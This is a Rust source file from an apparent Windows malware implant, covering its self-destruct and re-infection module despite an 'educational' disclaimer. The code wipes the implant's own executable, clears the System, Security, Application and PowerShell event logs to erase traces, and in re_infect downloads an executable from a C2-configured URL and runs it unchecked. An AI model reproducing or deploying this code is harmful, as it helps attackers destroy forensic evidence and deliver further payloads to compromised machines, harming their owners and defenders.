/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// self_destruct.rs — secure deletion, event-log clear, and re-infection.
//
// execute(true)  = uninstall persistence, overwrite PE, wevtutil, exit.
// execute(false) = exit only (used from dead Phase 5 in main).
// re_infect()    = download HTTPS blob from C2 config, spawn, then execute(true).
//
// BROKEN:
//   - Overwriting a running PE often fails sharing; reboot-delete is realistic.
//   - re_infect depends on fetch_config() and a working relay URL (c2.rs broken).
//   - Downloaded blob is executed with no integrity check.
//   - wevtutil cl Security needs admin and is extremely noisy.

use crate::persistence;
use log::info;
use rand::Rng;
use std::fs::{self, File, OpenOptions};
use std::io::{Seek, SeekFrom, Write};
use std::path::{Path, PathBuf};
use std::process;
use winapi::um::winnt::HANDLE;
use std::os::windows::io::AsRawHandle;

/// If `forced`, wipe artifacts then `process::exit(0)`. Always exits.
pub fn execute(forced: bool) {
    if forced {
        info!("Self-destruct triggered.");
        let _ = persistence::uninstall();
        if let Ok(exe) = std::env::current_exe() {
            if secure_delete(&exe).is_err() {
                info!("Secure delete failed — scheduling deletion on next reboot.");
                unsafe { schedule_delete_on_reboot(&exe); }
            }
        }
        clear_event_logs();
    }
    process::exit(0);
}

/// Three-pass overwrite: zeros → ones → random, then mark for deletion.
/// FileDispositionInfo class 4 (was incorrectly class 1 in an earlier version).
fn secure_delete(path: &Path) -> Result<(), anyhow::Error> {
    let size = fs::metadata(path)?.len() as usize;
    if size == 0 { return Ok(()); }

    let mut file = OpenOptions::new().write(true).open(path)?;

    let chunk = 4096usize;
    let passes: &[u8] = &[0x00, 0xFF];
    for &fill in passes {
        file.seek(SeekFrom::Start(0))?;
        let buf: Vec<u8> = vec![fill; chunk];
        let mut written = 0;
        while written < size {
            let end = (written + chunk).min(size);
            file.write_all(&buf[..end - written])?;
            written = end;
        }
        file.flush()?;
    }

    // Random pass.
    file.seek(SeekFrom::Start(0))?;
    let mut rng = rand::thread_rng();
    let mut written = 0;
    while written < size {
        let end = (written + chunk).min(size);
        let mut buf = vec![0u8; end - written];
        rng.fill(buf.as_mut_slice());
        file.write_all(&buf)?;
        written = end;
    }
    file.flush()?;

    // BUG FIX: original passed info class `1` (FileBasicInfo) — that class
    // has a completely different structure and ignores the DeleteFile field.
    // Correct class for FILE_DISPOSITION_INFO is `4` (FileDispositionInfo).
    unsafe {
        use winapi::um::fileapi::SetFileInformationByHandle;
        use winapi::um::winbase::FILE_DISPOSITION_INFO;
        let handle = file.as_raw_handle() as HANDLE;
        let mut info = FILE_DISPOSITION_INFO { DeleteFile: 1 };
        SetFileInformationByHandle(
            handle,
            4,  // FileDispositionInfo — was incorrectly 1 in original
            &mut info as *mut _ as *mut _,
            std::mem::size_of::<FILE_DISPOSITION_INFO>() as u32,
        );
    }

    drop(file);
    let _ = fs::remove_file(path);
    Ok(())
}

/// MOVEFILE_DELAY_UNTIL_REBOOT (0x4) so the loader is removed after reboot
/// if in-use overwrite failed.
unsafe fn schedule_delete_on_reboot(path: &Path) {
    use winapi::um::winbase::MoveFileExW;
    use std::os::windows::ffi::OsStrExt;
    let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
    MoveFileExW(wide.as_ptr(), std::ptr::null(), 0x4 /* MOVEFILE_DELAY_UNTIL_REBOOT */);
}

/// wevtutil cl System, Security, Application, PowerShell/Operational.
fn clear_event_logs() {
    for log in &["System", "Security", "Application"] {
        let _ = process::Command::new("cmd")
            .args(&["/C", &format!("wevtutil cl {}", log)])
            .output();
    }
    // Also clear PowerShell operational log to remove loader traces.
    let _ = process::Command::new("cmd")
        .args(&["/C", r"wevtutil cl Microsoft-Windows-PowerShell/Operational"])
        .output();
}

/// Download a new payload from the URL configured in the C2 config and execute.
/// Requires config JSON key `reinfect_url` starting with https://.
pub fn re_infect() {
    // BUG FIX: original had a hardcoded placeholder URL — operator couldn't
    // change it without rebuilding.  Now fetches the URL from C2 config.
    // BROKEN: fetch_config needs a working relay_url() (currently sentinel).
    let config_raw = match crate::c2::fetch_config() {
        Some(c) => c,
        None    => { log::error!("re_infect: no config available."); return; }
    };
    let url = match serde_json::from_str::<serde_json::Value>(&config_raw)
        .ok()
        .and_then(|v| v["reinfect_url"].as_str().map(|s| s.to_string()))
    {
        Some(u) if u.starts_with("https://") => u,
        _ => { log::error!("re_infect: no valid reinfect_url in config."); return; }
    };

    info!("re_infect: downloading from {}", url);
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .unwrap_or_default();
    match client.get(&url).send() {
        Ok(resp) if resp.status().is_success() => {
            if let Ok(bytes) = resp.bytes() {
                let temp = std::env::temp_dir().join(format!("~{:x}.exe", rand::random::<u32>()));
                if fs::write(&temp, &bytes).is_ok() {
                    let _ = process::Command::new(&temp).spawn();
                    execute(true);
                }
            }
        }
        Ok(r)  => log::error!("re_infect: HTTP {}", r.status()),
        Err(e) => log::error!("re_infect: {}", e),
    }
}
